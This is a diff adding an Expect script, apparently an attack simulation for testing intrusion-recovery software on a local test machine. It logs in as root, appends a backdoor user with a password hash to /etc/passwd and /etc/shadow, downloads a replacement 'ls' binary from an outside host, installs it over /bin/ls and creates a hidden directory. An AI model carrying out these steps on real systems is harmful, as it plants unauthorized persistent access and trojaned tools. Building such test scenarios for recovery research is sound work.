@@ -1,0 +1,41 @@
+#!/usr/bin/expect
+
+set timeout -1
+
+# 1. login as root
+spawn ssh root@localhost -p 2022 -o "PreferredAuthentications password" -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"
+expect "password:"
+send "root\n"
+
+# 2. add root100/root
+expect ":~# "
+send "echo root100:x:1001:1001:root100,,,:/home/root100:/bin/bash >> /etc/passwd\n"
+
+set passwd 'root100:\$6\$o1Y92sqe\$DqB3onZIXGZrGMeJ99anZi4LbokMWzx9QtxYpkUk9vQR.3qBe2stx5xaJGPyjy8qnYmARSjvOhy0THimA8/dR0:14731:0:99999:7:::'
+
+expect ":~# "
+send "echo $passwd >> /etc/shadow\n"
+
+expect ":~# "
+send "mkdir /home/root100\n"
+
+# 3. download 500 pictures
+for {set i 0} {$i < 500} {incr i 1} {
+    expect ":~# "
+    send "wget http://pdos.csail.mit.edu/img/pdostab.gif\n"
+}
+
+# 4. download ls & replace it & create hidden dir
+expect ":~# "
+send "wget pdos.csail.mit.edu/~taesoo/public/undosys/ls\n"
+expect ":~# "
+send "chmod +x ls\n"
+expect ":~# "
+send "mv ls /bin/ls\n"
+expect ":~# "
+send "mkdir hidden\n"
+
+expect ":~# "
+send "logout\n"
+wait
+
